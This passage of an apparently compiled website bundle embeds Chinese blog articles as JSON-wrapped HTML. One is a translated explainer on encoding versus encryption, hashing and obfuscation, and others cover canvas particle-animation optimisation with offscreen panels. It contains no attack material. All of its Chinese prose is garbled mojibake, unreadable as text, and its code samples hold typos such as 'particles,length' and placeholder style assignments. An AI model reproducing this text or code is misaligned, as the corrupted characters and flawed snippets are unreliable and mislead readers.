href=\\"https://en.wikipedia.org/wiki/Base64\\">BASE64</a></p>\\n<p>åŠ å¯†</p>\\n<p><img src=\\"/article/img/ciphertext.png\\" alt=\\"ciphertext\\"></p>\\n<p>åŠ å¯†çš„ç›®çš„æ˜¯è½¬æ¢æ•°æ®ä»¥ä½¿å…¶å¯¹å…¶ä»–äººä¿å¯†ï¼Œä¾‹å¦‚:é€šè¿‡äº’è”ç½‘å‘æŸäººå‘é€ä¸€å°åªæœ‰ä»–ä»¬æ‰èƒ½é˜…è¯»çš„ç§˜å¯†ä¿¡ä»¶ï¼Œæˆ–è€…å®‰å…¨åœ°å‘é€å¯†ç ã€‚\\næ¯”èµ·å…³æ³¨é€‚ç”¨å’Œæ˜“ç”¨æ€§ï¼ŒåŠ å¯†çš„ç›®çš„æ˜¯ç¡®ä¿é™¤äº†é¢„æœŸæ¥æ”¶è€…ä¹‹å¤–çš„ä»»ä½•äººéƒ½ä¸èƒ½è§£è¯»æ•°æ®ã€‚</p>\\n<p>åŠ å¯†å°†æ•°æ®é€šè¿‡æŸç§æ–¹å¼è½¬æ¢ä¸ºå¦ä¸€ç§æ ¼å¼ï¼Œä½¿å¾—åªæœ‰ç‰¹å®šçš„ä¸ªäººå¯ä»¥è§£å¯†ã€‚ å®ƒé€šè¿‡ç§æœ‰å¯†é’¥ï¼Œç»“åˆæ•°æ®å†…å®¹å’Œç®—æ³•æ‰§è¡ŒåŠ å¯†æ“ä½œã€‚\\nå› æ­¤ï¼Œå¯¹åŠ å¯†å†…å®¹çš„è§£å¯†éœ€è¦å¯†æ–‡ï¼Œç®—æ³•å’Œå¯†é’¥ç¼ºä¸€ä¸å¯ã€‚</p>\\n<p>ä¾‹å­ï¼š<a href=\\"http://www.aes.org/\\">AES</a>, <a href=\\"https://en.wikipedia.org/wiki/Blowfish_(cipher)\\">BLOWFISH</a>, <a href=\\"http://www.rsa.com/\\">RSA</a></p>\\n<h3 id=\\"san-lie-fa-ha-xi\\">æ•£åˆ—æ³•(å“ˆå¸Œ)</h3>\\n<p><img src=\\"/article/img/sha512.gif\\" alt=\\"sha512\\"></p>\\n<p>æ•£åˆ—æ³•çš„ç›®çš„æ˜¯ç¡®ä¿å®Œæ•´æ€§ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æ•°æ®å†…å®¹å‘ç”Ÿå˜åŒ–æ—¶ä½ å¯ä»¥çŸ¥é“å®ƒå·²è¢«æ›´æ”¹ã€‚\\nä»æŠ€æœ¯ä¸Šè®²ï¼Œæ•£åˆ—å¯¹ä»»æ„è¾“å…¥éƒ½ä¼šç”Ÿæˆå›ºå®šé•¿åº¦å­—ç¬¦ä¸²ï¼Œå®ƒç¬¦åˆä»¥ä¸‹ç‰¹æ€§ï¼š</p>\\n<ol>\\n<li>è¾“å…¥ç›¸åŒï¼Œè¾“å‡ºä¸€å®šç›¸åŒ</li>\\n<li>ç»å¤§éƒ¨åˆ†ä¸åŒçš„è¾“å…¥ä¸åº”è¯¥äº§ç”Ÿç›¸åŒçš„è¾“å‡º</li>\\n<li>è¾“å…¥åˆ°è¾“å‡ºè¡Œä¸ºä¸å¯é€†</li>\\n<li>å¯¹è¾“å…¥å€¼çš„ä¿®æ”¹ä¼šå¯¼è‡´è¾“å‡ºäº§ç”Ÿå·¨å¤§çš„æ”¹å˜</li>\\n</ol>\\n<p>æ•£åˆ—æ³•ä¸è®¤è¯ç»“åˆä½¿ç”¨ï¼Œç¡®ä¿æŸä¸ªç‰¹å®šçš„æ¶ˆæ¯æœªè¢«ä¿®æ”¹ã€‚ å®ƒçš„å®ç°é€šè¿‡å¯¹éœ€è¦ä¼ é€çš„æ¶ˆæ¯è¿›è¡Œæ•£åˆ—å¤„ç†ï¼Œç„¶åä½¿ç”¨å‘é€æ–¹çš„å¯†é’¥å¯¹è¿™ä¸ªæ•£åˆ—å€¼åŠ å¯†ã€‚</p>\\n<p>å½“æ¥æ”¶æ–¹æ”¶åˆ°æ¶ˆæ¯æ—¶ï¼Œä»–ä»¬å¯ä»¥ä½¿ç”¨å‘é€æ–¹çš„å…¬é’¥è§£å¯†å‡ºæ•£åˆ—å€¼ï¼Œç„¶åè‡ªå·±å¯¹é‚®ä»¶è¿›è¡Œæ•£åˆ—å¤„ç†ï¼Œå¹¶å°†è‡ªå·±å¤„ç†å¾—å‡ºçš„æ•£åˆ—å€¼ä¸å‘é€æ–¹ä¼ æ¥çš„çš„æ•£åˆ—å€¼è¿›è¡Œæ¯”è¾ƒã€‚ å¦‚æœèƒ½åŒ¹é…åˆ™æ˜¯ä¸€ä¸ªæœªä¿®æ”¹çš„æ¶ˆæ¯ã€‚</p>\\n<p>ä¾‹å­ï¼š<a href=\\"https://en.wikipedia.org/wiki/SHA-3\\">SHA-3</a>, <a href=\\"https://en.wikipedia.org/wiki/MD5\\">MD5 (å·²ç»åºŸå¼ƒ)</a>, ç­‰ç­‰ã€‚</p>\\n<h3 id=\\"hun-xiao\\">æ··æ·†</h3>\\n<p><img src=\\"/article/img/obfuscated-e1454498907454.png\\" alt=\\"obfuscated\\"></p>\\n<p>æ··æ·†çš„ç›®çš„æ˜¯ä½¿æŸäº›ä¸œè¥¿æ›´éš¾ç†è§£ï¼Œé€šå¸¸æ˜¯ä¸ºäº†ä½¿æ”»å‡»æˆ–å¤åˆ¶æ›´åŠ å›°éš¾ã€‚</p>\\n<p>ä¸€ä¸ªå¸¸è§çš„ç”¨é€”æ˜¯æ··æ·†æºä»£ç ï¼Œä½¿å¾—è¿™ä¸ªé¡¹ç›®éš¾ä»¥è¢«é€†å‘å·¥ç¨‹ã€‚</p>\\n<p>é‡è¦çš„ä¸€ç‚¹ï¼Œæ··æ·†å¹¶ä¸æ˜¯ä¸€ä¸ªå®‰å…¨çš„ä¿æŠ¤æªæ–½(ä¾‹å¦‚åŠ å¯†ï¼‰ï¼Œè€Œæ˜¯ä¸€ä¸ªå¹²æ‰°ã€‚\\nå®ƒä¸ç¼–ç ä¸€æ ·ï¼Œé€šå¸¸å¯ä»¥é€šè¿‡ä½¿ç”¨å¯¹æ•°æ®æ··æ·†çš„ç®—æ³•æ¥é€†è½¬ï¼Œæˆ–è€…é€šè¿‡ä¸€ä¸ªè€—æ—¶çš„äººå·¥å¤„ç†ã€‚</p>\\n<p>å…³äºæ··æ·†çš„å¦ä¸€ä¸ªå…³é”®ç‚¹ï¼Œæ ¹æ®å¯¹è¦è¿›è¡Œæ··æ·†çš„å†…å®¹ä¸åŒï¼Œæ··æ·†ä»£ç çš„ç¨‹åº¦æ˜¯æœ‰é™åˆ¶çš„ã€‚\\nä¾‹å¦‚ï¼Œå¦‚æœä½ è¦å¯¹ä»£ç è¿›è¡Œæ··æ·†ï¼Œå¿…é¡»è¦ä¿è¯æ··æ·†çš„ç»“æœä»ç„¶å¯ä»¥è¢«è®¡ç®—æœºè§£æï¼Œå¦åˆ™ç¨‹åºå°†åœæ­¢è¿è¡Œã€‚</p>\\n<p>ä¾‹å­: <a href=\\"https://javascriptobfuscator.com/\\">JAVASCRIPT OBFUSCATOR</a>, <a href=\\"http://proguard.sourceforge.net/\\">PROGUARD</a></p>\\n<h3 id=\\"zong-jie\\">æ€»ç»“</h3>\\n<p>ç¼–ç ç”¨äºç»´æŒæ•°æ®èƒ½åˆé€‚çš„ä½¿ç”¨ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡é‡‡ç”¨å¯¹å†…å®¹è¿›è¡Œç¼–ç çš„ç›¸åŒç®—æ³•æ¥é€†è½¬ï¼Œä¸éœ€è¦å¯†é’¥ã€‚</p>\\n<p>åŠ å¯†ç”¨äºç»´æŠ¤æ•°æ®æœºå¯†æ€§ï¼Œå¹¶ä¸”éœ€è¦ä½¿ç”¨å¯†é’¥ï¼ˆä¿å¯†ï¼‰æ‰èƒ½è·å–åŸæ•°æ®ã€‚</p>\\n<p>æ•£åˆ—æ³•ç”¨äºé€šè¿‡æ£€æµ‹æ•°æ®æ•£åˆ—å€¼æ˜¯å¦æœ‰æ˜æ˜¾æ”¹å˜ï¼Œæ¥éªŒè¯æ•°æ®å†…å®¹çš„å®Œæ•´æ€§ã€‚</p>\\n<p>æ··æ·†ç”¨äºé˜²æ­¢äººä»¬ç†è§£æŸäº›å†…å®¹ï¼Œç»å¸¸ç”¨äºæ··æ·†ä»£ç ä»¥é˜²æ­¢é€†å‘å·¥ç¨‹å’Œç›—çªƒäº§å“çš„åŠŸèƒ½ã€‚</p>\\n<hr>\\n<p><em>æ³¨æ„</em>ï¼š</p>\\n<p>æœ‰äººå¯èƒ½ä¼šé—®ï¼Œä½•æ—¶ä½¿ç”¨æ··æ·†è€Œä¸æ˜¯åŠ å¯†ï¼Œç­”æ¡ˆæ˜¯æ··æ·†åçš„å†…å®¹èƒ½ä½¿ä¸€ä¸ªå®ä½“ï¼ˆå¦‚äººç±»ï¼‰æ›´éš¾ç†è§£ï¼Œä½†å…¶ä»–ä¸€äº›ä¸œè¥¿ï¼ˆå¦‚è®¡ç®—æœºï¼‰èƒ½è½»æ˜“è§£æã€‚\\nè€Œé€šè¿‡åŠ å¯†åçš„å†…å®¹ï¼Œäººå’Œè®¡ç®—æœºéƒ½æ— æ³•åœ¨æ²¡æœ‰å¯†é’¥çš„æƒ…å†µä¸‹è§£æå†…å®¹ã€‚</p>\\n","toc":[{"anchor":"bian-ma","level":3,"text":"ç¼–ç "},{"anchor":"san-lie-fa-ha-xi","level":3,"text":"æ•£åˆ—æ³•(å“ˆå¸Œ)"},{"anchor":"hun-xiao","level":3,"text":"æ··æ·†"},{"anchor":"zong-jie","level":3,"text":"æ€»ç»“"}],"relatedTags":null,"created_at":"2018-07-04","timeArr":[2018,6,4,0,0,0,0],"title":"ç¼–ç -åŠ å¯†-å“ˆå¸Œ-æ··æ·†ä¸åŒç‚¹-æ–‡ç« ç¿»è¯‘","uuid":"e3c935001e875147dac6c7b68d6d86f7cfb78754","summary":"<p><a href=\\"https://danielmiessler.com/study/encoding-encryption-hashing-obfuscation/\\">åŸæ–‡é˜…è¯»</a></p>\\n<p><img src=\\"/article/img/js_obfuscation.png\\" alt=\\"js_obfuscation\\"></p>\\n<p><a href=\\"#%E7%BC%96%E7%A0%81\\">ç¼–ç </a></p>\\n<p><a href=\\"#%E5%8A%A0%E5%AF%86\\">åŠ å¯†</a></p>\\n<p>[æ•£åˆ—...</p>","slug":"bian-ma-jia-mi-ha-xi-hun-xiao-bu-tong-dian-wen-zhang-fan-yi","sha":"e315fbb406b0f3100dfcf4ec5b7ebb7fc1f41a83"}')},576:function(n){n.exports=JSON.parse('{"content":"<p>canvasåšå¤§é‡é‡å¤çš„ç²’å­è¿åŠ¨ï¼Œä¾‹å¦‚é›ªèŠ±ï¼Œæ˜Ÿå…‰é—ªçƒ</p>\\n<p>å¹¶ä¸éœ€è¦é’ˆå¯¹æ¯ä¸€ä¸ªç²’å­è¿›è¡ŒåŠ¨ç”»ï¼Œä¾‹å¦‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;particles,length;i++){\\n  <span class=\\"hljs-keyword\\">let</span> p=particles[i]\\n  ctx.beginPath()\\n  ctx.fillStyle=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{}\\n  ctx.fillRect(p.x, p.y, w, h);\\n}</code></pre></code></pre>\\n<p>åªéœ€è¦é’ˆå¯¹é‡å¤è¿åŠ¨åšå‡º2-3ä¸ªç”»æ¿ï¼Œå°†æ‰€æœ‰çš„ç²’å­å¹³å‡å¡«å……åˆ°ç”»æ¿ä¸Šï¼Œå†ç§»åŠ¨ç”»æ¿ä¾¿å¯,</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// åˆ›å»ºç”»æ¿</span>\\n<span class=\\"hljs-keyword\\">let</span> panels=[]\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;num;i++) {\\n    <span class=\\"hljs-keyword\\">let</span> c = <span class=\\"hljs-built_in\\">document</span>.createElement(<span class=\\"hljs-string\\">\'canvas\'</span>);\\n    c.width =canvasW\\n    c.height = canvasH;\\n    panels.push({\\n      <span class=\\"hljs-attr\\">canvas</span>: c,\\n      <span class=\\"hljs-attr\\">ctx</span>: c.getContext(<span class=\\"hljs-string\\">\'2d\'</span>),\\n      <span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">0</span>,\\n      <span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">0</span>,\\n      <span class=\\"hljs-attr\\">vx</span>:<span class=\\"hljs-number\\">0</span>,\\n      <span class=\\"hljs-attr\\">vy</span>:<span class=\\"hljs-number\\">0</span>\\n    })\\n}\\n<span class=\\"hljs-comment\\">// å¡«å……</span>\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;particles,length;i++){\\n  <span class=\\"hljs-keyword\\">let</span> p=particles[i]\\n  <span class=\\"hljs-keyword\\">let</span> cur=<span class=\\"hljs-built_in\\">Math</span>.floor(<span class=\\"hljs-built_in\\">Math</span>.random()*(panels.length<span class=\\"hljs-number\\">-0.01</span>))\\n  <span class=\\"hljs-keyword\\">let</span> cctx=panels[cur].ctx\\n  cctx.beginPath()\\n  cctx.fillStyle=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{}\\n  cctx.fillRect(p.x, p.y, w, h);\\n}\\n\\n<span class=\\"hljs-comment\\">// ç”»æ¿ç§»åŠ¨</span>\\n raf(<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">playing</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n    ctx.clearRect(<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">0</span>,canvasW,canvasH)\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;panels.length;i++){\\n      panels[i].vx=(<span class=\\"hljs-number\\">0</span>-panels[i].x)*<span class=\\"hljs-number\\">0.1</span>\\n      panels[i].vy=(<span class=\\"hljs-number\\">0</span>-panels[i].y)*<span class=\\"hljs-number\\">0.1</span>\\n      panels[i].x+=panels[i].vx\\n      panels[i].y+=panels[i].vy\\n      <span class=\\"hljs-keyword\\">if</span>(<span class=\\"hljs-built_in\\">Math</span>.abs(panels[i].y<span class=\\"hljs-number\\">-0</span>)&lt;<span class=\\"hljs-number\\">1</span>)panels[i].y=<span class=\\"hljs-number\\">0</span>\\n      <span class=\\"hljs-keyword\\">if</span>(<span class=\\"hljs-built_in\\">Math</span>.abs(panels[i].x<span class=\\"hljs-number\\">-0</span>)&lt;<span class=\\"hljs-number\\">1</span>)panels[i].x=<span class=\\"hljs-number\\">0</span>\\n      ctx.drawImage(panels[i].canvas,panels[i].x,panels[i].y)\\n    }\\n    raf(playing)\\n  })</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-20","timeArr":[2018,7,20,0,0,0,0],"title":"canvaså¤„ç†å¤§é‡é‡å¤è¿åŠ¨","uuid":"7d330d0cc2eaff951ab1a45bc216f483c483f6e0","summary":"<p>canvasåšå¤§é‡é‡å¤çš„ç²’å­è¿åŠ¨ï¼Œä¾‹å¦‚é›ªèŠ±ï¼Œæ˜Ÿå…‰é—ªçƒ</p>\\n<p>å¹¶ä¸éœ€è¦é’ˆå¯¹æ¯ä¸€ä¸ªç²’å­è¿›è¡ŒåŠ¨ç”»ï¼Œä¾‹å¦‚</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;particles,length;i++){\\n  <span class=\\"hljs-keyword\\">let</span> p=particles[i]\\n  ctx.beginPath()\\n  ctx.fillStyle=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{}\\n  ...</code></pre>","slug":"canvas-chu-li-da-liang-chong-fu-yun-dong","sha":"e43ef69f83c35b3fbffbb984a2b1c56c4c7db591"}')},577:function(n){n.exports=JSON.parse('{"content":"<p>æœ€è¿‘é‡åˆ°çš„ï¼Œç›®çš„æ˜¯é€šè¿‡ç²’å­åŠ¨ç”»æ¸²æŸ“å›¾ç‰‡</p>\\n<p>å›¾ç‰‡å¤§å°ä¸º500*300ï¼Œå¹¶ä¸”ç²’å­åŠ¨ç”»ç»†åº¦ä¸º1ï¼Œä¹Ÿå°±æ˜¯ç²’å­æ€»é‡ä¸º15ä¸‡ï¼Œå¹¶ä¸”å½“åŠ¨ç”»å®Œæˆåï¼Œå›¾ç‰‡èƒ½å®Œæ•´æ¸…æ™°çš„æ˜¾ç¤ºå‡ºæ¥</p>\\n<p>æœ€åˆå°è¯•15ä¸‡ä¸ªç²’å­åŒæ—¶è¿åŠ¨ï¼Œç»“æœæ ‡ç­¾é¡µç›´æ¥å´©æºƒäº†ï¼Œæ„æ–™ä¹‹ä¸­...</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> py = <span class=\\"hljs-number\\">0</span>; py &lt; targetH; py ++) {\\n    <span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> px = <span class=\\"hljs-number\\">0</span>; px &lt; targetW; px ++) {\\n      <span class=\\"hljs-keyword\\">let</span> rgba4 = (px + py * targetW) * <span class=\\"hljs-number\\">4</span> - <span class=\\"hljs-number\\">1</span>\\n      <span class=\\"hljs-keyword\\">if</span>(rgba4&lt;<span class=\\"hljs-number\\">0</span>)rgba4=<span class=\\"hljs-number\\">3</span>\\n      <span class=\\"hljs-keyword\\">const</span> rgba3=rgba4<span class=\\"hljs-number\\">-1</span>,rgba2=rgba3<span class=\\"hljs-number\\">-1</span>,rgba1=rgba2<span class=\\"hljs-number\\">-1</span>;\\n      <span class=\\"hljs-keyword\\">const</span> opacity = imgData.data[rgba4];\\n      <span class=\\"hljs-keyword\\">if</span> (opacity === <span class=\\"hljs-number\\">255</span>) {\\n        <span class=\\"hljs-keyword\\">const</span> opts={\\n          <span class=\\"hljs-attr\\">cur</span>:[px,py],\\n          <span class=\\"hljs-attr\\">end</span>:[px,py],\\n          <span class=\\"hljs-attr\\">color</span>:[imgData.data[rgba1],imgData.data[rgba2],imgData.data[rgba3],imgData.data[rgba4]],\\n           <span class=\\"hljs-comment\\">/* çœç•¥ï¼šä¸€äº›å…¶ä»–å‚æ•° */</span>\\n         }\\n         <span class=\\"hljs-comment\\">/* çœç•¥ï¼šå¯¹å½“å‰æ—¶é—´æˆ³çš„å¤„ç† */</span>\\n         <span class=\\"hljs-comment\\">/* çœç•¥ï¼šå¯¹åŠ¨ç”»çš„å¤„ç† */</span>\\n         ctx.fillStyle = <span class=\\"hljs-string\\">`rgba(<span class=\\"hljs-subst\\">${rgba1}</span>, <span class=\\"hljs-subst\\">${rgba2}</span>, <span class=\\"hljs-subst\\">${rgba3}</span>,<span class=\\"hljs-subst\\">${rgba4}</span>`</span>\\n         ctx.fillRect(curX, curY, <span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">1</span>);\\n      }\\n    }\\n  }</code></pre></code></pre>\\n<hr>\\n<p>åæ¥è€ƒè™‘ç¦»å±å§ï¼Œè§„å®šæ¯ä¸ªç¦»å±æ‰¿è½½é‡ä¸º1000(ä¿è¯fps)ï¼Œè¿™ä¹ˆä¸€æ¥ï¼Œ75ä¸ª<code>ç¦»å±canvas</code>ï¼Œå¼€å§‹åŠ¨ç”»...å¥”æºƒäº†...</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">default</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">createAssignParticles</span>(<span class=\\"hljs-params\\">allParticles</span>)</span>{\\n  <span class=\\"hljs-comment\\">// å®šä¹‰æ¯ä¸ªç¦»å±æ‰¿è½½é‡</span>\\n  <span class=\\"hljs-keyword\\">const</span> eachPanelParticles=<span class=\\"hljs-number\\">1000</span>\\n  <span class=\\"hljs-keyword\\">const</span> assignedParticles=[]\\n  <span class=\\"hljs-keyword\\">const</span> panelsSize=<span class=\\"hljs-built_in\\">Math</span>.ceil(allParticles.length/eachPanelParticles)\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;panelsSize;i++){\\n    <span class=\\"hljs-comment\\">// åˆ›å»ºç¦»å±canvas</span>\\n    <span class=\\"hljs-keyword\\">const</span>  canvas = <span class=\\"hljs-built_in\\">document</span>.createElement(<span class=\\"hljs-string\\">\'canvas\'</span>);\\n    canvas.width=<span class=\\"hljs-built_in\\">window</span>.outerWidth\\n    canvas.height=<span class=\\"hljs-built_in\\">window</span>.outerHeight;\\n    <span class=\\"hljs-keyword\\">const</span> ctx=canvas.getContext(<span class=\\"hljs-string\\">\'2d\'</span>)\\n    <span class=\\"hljs-comment\\">// åæ¸²æŸ“çš„åœ¨ä¸Šå±‚</span>\\n    ctx.globalCompositeOperation=<span class=\\"hljs-string\\">\'destination-over\'</span>\\n    <span class=\\"hljs-comment\\">// å–æ¶ˆæŠ—é”¯é½¿</span>\\n    ctx.imageSmoothingEnabled = <span class=\\"hljs-literal\\">false</span>;\\n    ctx.mozImageSmoothingEnabled = <span class=\\"hljs-literal\\">false</span>;\\n    ctx.webkitImageSmoothingEnabled = <span class=\\"hljs-literal\\">false</span>;\\n    assignedParticles[i]={\\n      <span class=\\"hljs-attr\\">sourceArr</span>:[],\\n      canvas,\\n      ctx,\\n    }\\n  }\\n  <span class=\\"hljs-comment\\">// ä¹±åºå°†æ¯ä¸ªç²’å­å¹³å‡æ’å…¥æ¯ä¸ªç¦»å±canvas</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;allParticles.length;i++){\\n    <span class=\\"hljs-keyword\\">const</span> putInWhichPanel=<span class=\\"hljs-built_in\\">Math</span>.floor(<span class=\\"hljs-built_in\\">Math</span>.random()*(panelsSize<span class=\\"hljs-number\\">-0.01</span>))\\n    assignedParticles[putInWhichPanel].sourceArr.push(allParticles[i])\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> assignedParticles\\n}\\n\\n<span class=\\"hljs-comment\\">// æ‰§è¡ŒåŠ¨ç”»å‡½æ•°å†…éƒ¨</span>\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;assignedParticles.length;i++){\\n  <span class=\\"hljs-keyword\\">let</span> cur=assignedParticles[i].sourceArr\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> j=<span class=\\"hljs-number\\">0</span>;j&lt;cur.length;j++){\\n     <span class=\\"hljs-comment\\">/* çœç•¥ï¼šå¯¹å½“å‰æ—¶é—´æˆ³çš„å¤„ç† */</span>\\n     <span class=\\"hljs-comment\\">/* çœç•¥ï¼šå¯¹åŠ¨ç”»çš„å¤„ç† */</span>\\n     ctx.fillStyle = <span class=\\"hljs-string\\">`rgba(<span class=\\"hljs-subst\\">${rgba1}</span>, <span class=\\"hljs-subst\\">${rgba2}</span>, <span class=\\"hljs-subst\\">${rgba3}</span>,<span class=\\"hljs-subst\\">${rgba4}</span>`</span>\\n     ctx.fillRect(curX, curY, <span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">1</span>);\\n  }\\n}</code></pre></code></pre>\\n<p>æ¯•ç«ŸåŒæ—¶è¿åŠ¨çš„æ€»é‡è¿˜æ˜¯15ä¸‡ä¸ªç²’å­...</p>\\n<p>æ—¢ç„¶ä¸èƒ½åŒæ—¶è¿åŠ¨ï¼Œé‚£ä¹ˆå°±åˆ†æ‰¹è¿åŠ¨æ€»è¡Œäº†å§</p>\\n<hr>\\n<p>æ¯ä¸ª<code>ç¦»å±canvas</code>æ‰§è¡Œå®Œæ¯•ï¼Œé€’å½’è°ƒç”¨ä¸‹ä¸€ä¸ª<code>ç¦»å±canvas</code>ï¼Œä½†è¿™æ ·åˆå‡ºç°ä¸€ä¸ªæ–°çš„é—®é¢˜ï¼Œ</p>\\n<p>å¦‚æœæ¯ä¸ª<code>ç¦»å±canvas</code>æ‰§è¡Œåï¼Œæ¸…é™¤æ˜¾ç¤ºç”¨çš„ç”»å¸ƒï¼Œé‚£ä¹ˆåŠ¨ç”»åªæ˜¯ä¼šå‡ºç°æ¯ä¸€ä¸ªç¦»å±çš„åŠ¨ç”»ï¼Œä¸Šä¸€ä¸ªç¦»å±åŠ¨ç”»çš„ç»“æœå¹¶æœªä¿å­˜ã€‚</p>\\n<p>å¦‚æœä¸æ¸…é™¤æ˜¾ç¤ºçš„ç”»å¸ƒï¼Œé‚£ä¹ˆæ¯ä¸ª<code>ç¦»å±canvas</code>ä¼šæœ‰è½¨è¿¹ï¼Œé€ æˆæ¨¡ç³Š(è™½ç„¶ä¹ŸæŒºå¥½çœ‹ï¼Œä½†ä¸æ˜¯éœ€è¦çš„æ•ˆæœ)ã€‚</p>\\n<p><img src=\\"/article/img/%E5%B8%A6%E8%BD%A8%E8%BF%B9.png\\" alt=\\"\\"></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">import</span> raf <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'raf\'</span>\\n<span class=\\"hljs-keyword\\">import</span> {spiral,fadeIn,explode} <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'./animations-control/core\'</span>\\n<span class=\\"hljs-keyword\\">import</span> stopIfNeed <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'./animations-control/stopIfNeed\'</span>\\n<span class=\\"hljs-keyword\\">import</span> lastRenders <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'./animations-control/lastRenders\'</span>\\n\\n\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">default</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">play</span>(<span class=\\"hljs-params\\">assignedParticles,c_showMotion,ctx_showMotion,options,doneCallBack</span>)</span>{\\n  <span class=\\"hljs-comment\\">/* çœç•¥ï¼šè·å–ä¼šç”¨åˆ°çš„å‚æ•°*/</span>\\n  <span class=\\"hljs-keyword\\">let</span> allParticlesIdx=<span class=\\"hljs-number\\">0</span>\\n  recursionExec(allParticlesIdx)\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>  <span class=\\"hljs-title\\">recursionExec</span>(<span class=\\"hljs-params\\">allParticlesIdx</span>)</span>{\\n    <span class=\\"hljs-keyword\\">let</span> arrs=assignedParticles[allParticlesIdx].sourceArr\\n    <span class=\\"hljs-keyword\\">let</span> ctx=assignedParticles[allParticlesIdx].ctx\\n    <span class=\\"hljs-keyword\\">let</span> canvas=assignedParticles[allParticlesIdx].canvas\\n    <span class=\\"hljs-keyword\\">let</span> doneNum=<span class=\\"hljs-number\\">0</span>\\n    <span class=\\"hljs-keyword\\">let</span> rafHandle\\n    <span class=\\"hljs-keyword\\">let</span> msPerFrame=<span class=\\"hljs-number\\">1000</span>/<span class=\\"hljs-number\\">60</span>\\n    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">startIfNeed</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n      rafHandle= raf(<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">playing</span>(<span class=\\"hljs-params\\">timestamp</span>)</span>{\\n       <span class=\\"hljs-comment\\">/* çœç•¥ï¼šåˆ¤æ–­å½“å‰ç¦»å±canvasæ˜¯å¦ç»“æŸ */</span>\\n\\n       <span class=\\"hljs-comment\\">// æ‰§è¡Œå½“å‰ç¦»å±canvas</span>\\n      ctx.clearRect(<span class=\\"hljs-number\\">0</span>, <span class=\\"hljs-number\\">0</span>, canvasW, canvasH)\\n      ctx.beginPath();\\n      <span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> k = <span class=\\"hljs-number\\">0</span>; k &lt; arrs.length; k++) {\\n        <span class=\\"hljs-keyword\\">let</span> {cur,end} = arrs[k]\\n        <span class=\\"hljs-comment\\">/* çœç•¥ï¼šåˆ¤æ–­å½“å‰ç²’å­æ˜¯å¦éœ€è¦åœæ­¢*/</span>\\n        <span class=\\"hljs-comment\\">/* çœç•¥ï¼šå¯¹å½“å‰æ—¶é—´æˆ³çš„å¤„ç† */</span>\\n        <span class=\\"hljs-comment\\">/* çœç•¥ï¼šå¯¹åŠ¨ç”»çš„å¤„ç† */</span>\\n\\n        ctx.fillStyle = <span class=\\"hljs-string\\">`rgba(<span class=\\"hljs-subst\\">${rgba1}</span>, <span class=\\"hljs-subst\\">${rgba2}</span>, <span class=\\"hljs-subst\\">${rgba3}</span>,<span class=\\"hljs-subst\\">${rgba4}</span>`</span>\\n        ctx.fillRect( curX,  curY, <span class=\\"hljs-number\\">1</span>, <span 